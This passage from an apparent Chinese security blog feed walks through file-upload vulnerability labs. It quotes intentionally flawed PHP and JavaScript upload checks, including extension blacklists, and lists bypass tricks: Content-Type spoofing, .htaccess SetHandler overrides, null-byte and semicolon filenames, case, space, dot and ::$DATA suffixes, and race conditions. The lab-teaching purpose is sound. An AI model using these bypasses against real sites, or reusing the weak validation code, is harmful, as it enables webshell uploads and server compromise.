$UPLOAD_ADDR.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</span><br><span class="line">                unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>可以看到使用上关一样的图片马即可</p><h2 id="17、18、条件竞争绕过"><a href="#17、18、条件竞争绕过" class="headerlink" title="17、18、条件竞争绕过"></a>17、18、条件竞争绕过</h2><p>定义：竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p><p>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><p>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。</p><p>某人的理解：两只哈士奇（线程）同时去抢一个丢出去的飞盘（资源），不知道到底哪只能抢到，此处便形成了竞争。</p><p>方法：</p><p>只要<strong>手速够快</strong>，就能成功</p><p>在burp中一直跑就行</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload06.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload05.png" alt="躲起来了"></p><p>19、move_uploaded_file()截断</p><p>move_uploaded_file() ：函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload07.png" alt="躲起来了"></p><p>方法：</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload08.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload09.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload10.png" alt="躲起来了"></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 南岸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞----解析、验证、伪造（一）</title>
      <link href="/2019/05/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2019/05/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a><a href="https://baike.baidu.com/item/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/11003736?fr=aladdin" target="_blank" rel="noopener">上传漏洞</a></h1><p>这个<a href="https://baike.baidu.com/item/%E6%BC%8F%E6%B4%9E/1688129" target="_blank" rel="noopener">漏洞</a>在DVBBS6.0时代被<a href="https://baike.baidu.com/item/%E9%BB%91%E5%AE%A2" target="_blank" rel="noopener">黑客</a>们利用的最为<a href="https://baike.baidu.com/item/%E7%8C%96%E7%8D%97/10714122" target="_blank" rel="noopener">猖獗</a>，利用上传漏洞可以直接得到<a href="https://baike.baidu.com/item/WEBSHELL" target="_blank" rel="noopener">WEBSHELL</a>，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。</p><p>导致该漏洞的原因在于代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。</p><hr><h2 id="1，前端验证绕过"><a href="#1，前端验证绕过" class="headerlink" title="1，前端验证绕过"></a>1，前端验证绕过</h2><p>当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p><h3 id="附上源码："><a href="#附上源码：" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然是前端验证那么只要随便的编辑一下页面/用burpsuite/写个小脚本就可以突破。</p><h2 id="2，Content-Type方式绕过"><a href="#2，Content-Type方式绕过" class="headerlink" title="2，Content-Type方式绕过"></a>2，Content-Type方式绕过</h2><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改，不过加上一层防护也是可以有一定效果的</p><h3 id="附上源码：-1"><a href="#附上源码：-1" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;文件类型不正确，请重新上传！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.&apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p>使用各种各样的工具（如burpsuite）强行篡改Header就可以，太容易将header中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/php</span><br></pre></td></tr></table></figure><p>或者其他类型</p><p>改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/jpg</span><br><span class="line">Content-Type: image/png</span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure><h2 id="3，黑名单绕过"><a href="#3，黑名单绕过" class="headerlink" title="3，黑名单绕过"></a>3，黑名单绕过</h2><p>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传</p><h3 id="附上源码：-2"><a href="#附上源码：-2" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR. <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .<span class="string">'/'</span>. $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">老版本的IIS中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析</span><br><span class="line">老板本的IIS中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg</span><br><span class="line">旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行</span><br><span class="line">nginx空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行</span><br><span class="line">apache的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</span><br></pre></td></tr></table></figure><h2 id="4，-htaccess文件绕过（重写解析规则—绕过）"><a href="#4，-htaccess文件绕过（重写解析规则—绕过）" class="headerlink" title="4，.htaccess文件绕过（重写解析规则—绕过）"></a>4，.htaccess文件绕过（<strong>重写解析规则—绕过</strong>）</h2><p>上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。</p><h3 id="附上源码：-3"><a href="#附上源码：-3" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传!&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在可以上传.htaccess文件时，先上传.htaccess文件，覆盖掉原先的.htaccess文件；再上传【evil.gif】文件。使用如下的.htaccess语句，即可将【evil.gif】文件以php脚本方式解析。</span><br><span class="line">&lt;FilesMatch &quot;evil.gif&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h2 id="5，后缀大小写绕过"><a href="#5，后缀大小写绕过" class="headerlink" title="5，后缀大小写绕过"></a>5，后缀大小写绕过</h2><h3 id="附上源码：-4"><a href="#附上源码：-4" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-1"><a href="#方法：-1" class="headerlink" title="方法："></a>方法：</h3><p>将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】</p><h2 id="6，文件后缀（空）绕过"><a href="#6，文件后缀（空）绕过" class="headerlink" title="6，文件后缀（空）绕过"></a>6，文件后缀（空）绕过</h2><h3 id="附上源码：-5"><a href="#附上源码：-5" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-2"><a href="#方法：-2" class="headerlink" title="方法："></a>方法：</h3><p>在burpsuite中抓包，在后缀加上空格即可</p><h2 id="7，文件后缀-点-绕过"><a href="#7，文件后缀-点-绕过" class="headerlink" title="7，文件后缀(点)绕过"></a>7，文件后缀(点)绕过</h2><h3 id="附上源码：-6"><a href="#附上源码：-6" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-3"><a href="#方法：-3" class="headerlink" title="方法："></a>方法：</h3><p>在burpsuite中抓包，在后缀加上一个点（’.’）即可</p><h2 id="8，-DATA（Windows文件流绕过）"><a href="#8，-DATA（Windows文件流绕过）" class="headerlink" title="8，::$DATA（Windows文件流绕过）"></a>8，::$DATA（Windows文件流绕过）</h2><p>这道题利用的是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA。当我们访问a.asp::DATA时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:2.asp，请求 a.asp:2.asp::$DATA，则是请求a.asp中的流数据2.asp的流数据内容。</p><h3 id="附上源码：-7"><a href="#附上源码：-7" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 